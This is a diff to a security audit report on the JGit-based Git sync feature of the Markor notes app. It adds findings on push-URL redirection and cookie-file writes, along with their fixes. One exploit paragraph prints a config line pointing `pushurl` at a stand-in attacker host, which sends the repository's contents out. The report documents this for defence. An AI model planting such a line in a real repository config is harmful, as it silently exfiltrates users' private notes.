@@ -29,7 +29,9 @@ Three properties of this feature decide how the findings below are rated.
 | 3 | **High** | fetch / pull / push never re-checked the remote URL from `.git/config`, so an `http://` remote received the stored token in clear text | `JGitRemoteOps.java:112,190,300` | **Fixed** — `3dc78e95` |
 | 4 | **Medium** | `http.sslVerify = false` in a repository's config disabled TLS certificate checking for that repository | `JGitRemoteOps.java` (absent) | **Fixed** — `3dc78e95` |
 | 5 | **Medium** | Repository-supplied paths were turned into `File`s without a containment check; the worst reached a recursive delete | `JGitRemoteOps.java:431,500`, `JGitLocalOps.java:401`, `GitConflictMarkers.java:111`, `ui/GitFragment.java:1634`, `ui/CommitDetailActivity.java:308,346` | **Fixed** — `5ecaa97b` |
-| 6 | Low | A removed repository's worker thread and its running operation were never stopped | `ui/GitFragment.java:900` | **Fixed** — `e1721430` |
+| 6 | **Medium** | `remote.<name>.pushurl` decides where a push goes, but the header and the push-confirmation dialog show `remote.<name>.url` | `JGitRemoteOps.java:300`, `JGitRepos.java:132`, `ui/GitFragment.java:1428` | **Fixed** — `e84c4f8f` |
+| 7 | Low | `http.cookieFile` + `http.saveCookies` make the app write a file at a path chosen in `.git/config` | `JGitRemoteOps.java` (absent) | **Fixed** — `12e26baf` |
+| 8 | Low | A removed repository's worker thread and its running operation were never stopped | `ui/GitFragment.java:900` | **Fixed** — `e1721430` |
 
 Verified as sound, no change needed: see [Checked and left alone](#checked-and-left-alone).
 
@@ -142,7 +144,49 @@ child against a non-canonical root would refuse every legitimate path. `GitPaths
 the two `.ui` callers; `normalize()` stays package-private and keeps using `getAbsolutePath`, which
 is deliberate — only `resolveInside` needs `..` resolved.
 
-### 6 — Low — a removed repository kept its worker thread and its running operation
+### 6 — Medium — a push could go somewhere the user was never shown
+
+`JGitRemoteOps.java` `push`, `JGitRepos.java:132`, `ui/GitFragment.java:1428`.
+
+JGit's `PushCommand` resolves its destination through `Transport.openAll`, which returns
+`RemoteConfig.getPushURIs()` when that list is non-empty and falls back to `getURIs()` only
+otherwise. The app never reads `remote.<name>.pushurl`: `JGitRepos.describe` reads only
+`CONFIG_KEY_URL`, so `GitRepoInfo.getRemoteUrl()` — and with it the tab header, the registry entry
+and, the point, the *Confirm before push* dialog added by task 7.1 — all name the **fetch** URL.
+
+Finding 3's scheme policy already covered the cleartext variant, because `remoteRefusal` inspected
+the push URIs too. It did not cover a `pushurl` pointing at a different **https** host: that passes
+the policy and receives no token (credentials are host-keyed), but it still receives the repository's
+contents, while the dialog the user just accepted named a different address.
+
+**Exploit.** An app with storage permission adds one line under `[remote "origin"]`:
+`pushurl = https://attacker.example/notes.git`. Nothing in the UI changes. Every future push sends
+the user's notes to the attacker, and the confirmation dialog says they are going to GitHub.
+
+**Fix.** `remoteRefusal` takes a `forPush` flag and checks exactly the URIs the operation will use —
+`pushurl` for a push, `url` for fetch and pull. A push whose `pushurl` differs from the fetch URL is
+refused with a sentence naming the key. The flag matters: without it a fetch was refused too, which
+is wrong, since a fetch never contacts `pushurl`.
+
+### 7 — Low — `http.cookieFile` made the app write a file at an attacker-chosen path
+
+`JGitRemoteOps.java`, previously absent.
+
+Disassembling `HttpConfig` from the shipped jar, JGit 5.13 reads `http.` `cookieFile`,
+`cookieFileCacheLimit`, `saveCookies`, `extraHeader`, `followRedirects`, `maxRedirects`, `sslVerify`,
+`postBuffer` and `userAgent` from the repository configuration. Of those, `cookieFile` +
+`saveCookies` is the pair that crosses a privilege boundary: the path is absolute and JGit writes the
+Netscape-format file back **as this app**, so whoever edits `.git/config` on shared storage can make
+Markor write into `/data/data/net.gsantner.markor/`, which they cannot reach themselves.
+
+**Fix.** Both keys are refused when present; the app sets neither, so their presence means someone
+else did.
+
+`extraHeader` and `followRedirects`/`maxRedirects` were assessed and **accepted**: the first only
+adds headers to requests going to the user's own remote, and the second cannot leak the token, given
+the redirect analysis under [Checked and left alone](#checked-and-left-alone).
+
+### 8 — Low — a removed repository kept its worker thread and its running operation
 
 `ui/GitFragment.java:900`.
 
@@ -153,6 +197,17 @@ each repository's single-thread executor was held for the life of the process, `
 a process-wide singleton.
 
 **Fix.** `removeRepository` calls `shutdownRepo`, which cancels and releases the lane.
+
+---
+
+## How much finding 2 was worth
+
+`GitFragment.applySnapshot` copies `_info.getRemoteUrl()` into `GitRepoConfig` and
+`GitRepoRegistry.update()` persists it as plaintext JSON in the default `SharedPreferences` — which
+Markor's Settings ▸ *Backup* exports to a user-chosen file, typically in the notebook folder on
+shared storage. So before finding 2 was fixed, a token hidden in a `:token@` remote URL did not merely
+appear on screen: it was copied into the app's preferences and would have been written into any
+settings backup the user made.
 
 ---
 
